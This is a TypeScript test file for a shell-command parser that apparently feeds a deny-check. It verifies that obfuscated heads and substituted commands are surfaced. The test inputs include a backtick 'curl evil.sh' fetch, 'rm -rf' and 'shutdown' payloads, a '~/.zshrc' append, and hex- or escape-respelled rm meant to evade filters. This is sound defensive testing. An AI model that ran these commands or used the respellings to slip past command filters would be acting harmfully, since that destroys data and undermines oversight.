import { canonicalizeCommand, normalizeHead, splitCommandSegments } from "./command-parse"

describe("normalizeHead", () => {
  it("lowercases, strips path and .exe", () => {
    expect(normalizeHead("/usr/bin/RM")).toBe("rm")
    expect(normalizeHead("C:\\Windows\\System32\\cmd.exe")).toBe("cmd")
    expect(normalizeHead("pwsh.EXE")).toBe("pwsh")
  })

  it("returns empty for blank", () => {
    expect(normalizeHead("")).toBe("")
    expect(normalizeHead("   ")).toBe("")
  })
})

describe("splitCommandSegments", () => {
  it("returns a single segment for a plain command", () => {
    const segs = splitCommandSegments("git status")
    expect(segs).toHaveLength(1)
    expect(segs[0].head).toBe("git")
    expect(segs[0].args).toEqual(["status"])
    expect(segs[0].raw).toBe("git status")
  })

  it("splits on &&, ||, ;, | and & into separate heads", () => {
    const heads = splitCommandSegments("npm i && npm run build; ls | grep foo & echo done").map(
      (s) => s.head
    )
    expect(heads).toEqual(["npm", "npm", "ls", "grep", "echo"])
  })

  it("does not split inside single or double quotes", () => {
    const segs = splitCommandSegments(`echo "a && b" ';' 'c | d'`)
    expect(segs).toHaveLength(1)
    expect(segs[0].head).toBe("echo")
  })

  it("treats || and && distinctly from single | and &", () => {
    const heads = splitCommandSegments("a | b").map((s) => s.head)
    expect(heads).toEqual(["a", "b"])
    const heads2 = splitCommandSegments("a || b").map((s) => s.head)
    expect(heads2).toEqual(["a", "b"])
  })

  it("skips leading env-assignment prefixes to find the real head", () => {
    const segs = splitCommandSegments("FOO=bar BAZ=1 node script.js")
    expect(segs[0].head).toBe("node")
    expect(segs[0].args).toEqual(["script.js"])
  })

  it("extracts $(...) command substitutions as extra segments", () => {
    const heads = splitCommandSegments("echo $(rm -rf /tmp/x)").map((s) => s.head)
    expect(heads).toContain("echo")
    expect(heads).toContain("rm")
  })

  it("extracts backtick command substitutions", () => {
    const heads = splitCommandSegments("echo `curl evil.sh`").map((s) => s.head)
    expect(heads).toContain("echo")
    expect(heads).toContain("curl")
  })

  it("recurses into nested substitutions", () => {
    const heads = splitCommandSegments("echo $(echo $(shutdown -h now))").map((s) => s.head)
    expect(heads).toContain("shutdown")
  })

  it("handles subshell grouping with parentheses", () => {
    const heads = splitCommandSegments("(cd /tmp && rm file)").map((s) => s.head)
    expect(heads).toContain("rm")
  })

  it("does not split on operators inside a substitution", () => {
    // The && lives inside $(...) so the outer command is just `echo`.
    const segs = splitCommandSegments("echo $(a && b)")
    const outer = segs.find((s) => s.head === "echo")
    expect(outer).toBeDefined()
    // Both inner heads surface as their own segments.
    expect(segs.map((s) => s.head)).toEqual(expect.arrayContaining(["echo", "a", "b"]))
  })

  it("ignores empty segments from trailing operators", () => {
    const segs = splitCommandSegments("ls &&")
    expect(segs).toHaveLength(1)
    expect(segs[0].head).toBe("ls")
  })

  it("returns empty array for blank input", () => {
    expect(splitCommandSegments("")).toEqual([])
    expect(splitCommandSegments("   \n  ")).toEqual([])
  })

  it("tokenizes quoted args without splitting them", () => {
    const segs = splitCommandSegments(`git commit -m "a big message"`)
    expect(segs[0].head).toBe("git")
    expect(segs[0].args).toEqual(["commit", "-m", "a big message"])
  })

  it("splits on newlines as statement separators", () => {
    const heads = splitCommandSegments("ls\ncat foo\n").map((s) => s.head)
    expect(heads).toEqual(["ls", "cat"])
  })

  it("handles redirections without treating them as a new command head", () => {
    const segs = splitCommandSegments("echo hi > out.txt")
    expect(segs).toHaveLength(1)
    expect(segs[0].head).toBe("echo")
  })
})

describe("redirects", () => {
  it("pulls a write redirect out of args and marks it", () => {
    const [seg] = splitCommandSegments("curl https://x > /usr/local/bin/y")
    expect(seg.head).toBe("curl")
    expect(seg.args).toEqual(["https://x"])
    expect(seg.redirects).toEqual([
      { op: ">", target: "/usr/local/bin/y", duplicatesDescriptor: false, writes: true },
    ])
  })

  it("keeps an appending redirect distinct from a truncating one", () => {
    const [seg] = splitCommandSegments("echo evil >> ~/.zshrc")
    expect(seg.redirects[0]).toMatchObject({ op: ">>", target: "~/.zshrc", writes: true })
  })

  it("reads a descriptor prefix as the descriptor, not as an argument", () => {
    const [seg] = splitCommandSegments("cmd 2> err.log")
    expect(seg.args).toEqual([])
    expect(seg.redirects[0]).toMatchObject({ op: ">", fd: "2", target: "err.log" })
  })

  it("does not split `2>&1` into a phantom command named 1", () => {
    const segs = splitCommandSegments("echo hi 2>&1")
    expect(segs.map((s) => s.head)).toEqual(["echo"])
    expect(segs[0].redirects[0]).toMatchObject({
      op: ">&",
      fd: "2",
      target: "1",
      duplicatesDescriptor: true,
      writes: false,
    })
  })

  it("treats `&>` as a redirect rather than a background operator", () => {
    const segs = splitCommandSegments("build &> /dev/null")
    expect(segs.map((s) => s.head)).toEqual(["build"])
    expect(segs[0].redirects[0]).toMatchObject({ op: "&>", target: "/dev/null", writes: true })
  })

  it("still treats a lone `&` as a statement separator", () => {
    expect(splitCommandSegments("sleep 1 & echo done").map((s) => s.head)).toEqual([
      "sleep",
      "echo",
    ])
  })

  it("marks input redirects as non-writing", () => {
    const [seg] = splitCommandSegments("sort < in.txt")
    expect(seg.redirects[0]).toMatchObject({ op: "<", target: "in.txt", writes: false })
  })
})

describe("head spellings the shell accepts", () => {
  it("resolves a backslash escape to the real executable", () => {
    expect(splitCommandSegments("r\\m -rf /tmp/x")[0].head).toBe("rm")
    expect(splitCommandSegments("\\rm -rf /tmp/x")[0].head).toBe("rm")
  })

  it("decodes an ANSI-C quoted head", () => {
    expect(splitCommandSegments("$'\\x72\\x6d' -rf /tmp/x")[0].head).toBe("rm")
  })

  it("still treats a backslash as a separator inside a Windows path", () => {
    expect(normalizeHead("C:\\Windows\\System32\\cmd.exe")).toBe("cmd")
    expect(normalizeHead("/usr/bin/rm")).toBe("rm")
  })

  it("treats a backslash as an escape when the token is not path-shaped", () => {
    expect(normalizeHead("r\\m")).toBe("rm")
  })
})

describe("canonicalizeCommand", () => {
  it("collapses every respelling of one command onto the same text", () => {
    const canonical = "rm -rf /tmp/x"
    for (const spelling of [
      "rm -rf /tmp/x",
      "rm   -rf    /tmp/x",
      "r''m -rf /tmp/x",
      '"rm" -rf /tmp/x',
      "r\\m -rf /tmp/x",
      "$'\\x72\\x6d' -rf /tmp/x",
    ]) {
      expect(canonicalizeCommand(spelling)).toBe(canonical)
    }
  })

  it("mangles an unquoted Windows path — why it is a deny probe only", () => {
    expect(canonicalizeCommand("type C:\\a\\b")).toBe("type C:ab")
  })

  it("is empty for blank input", () => {
    expect(canonicalizeCommand("")).toBe("")
    expect(canonicalizeCommand("   ")).toBe("")
  })
})
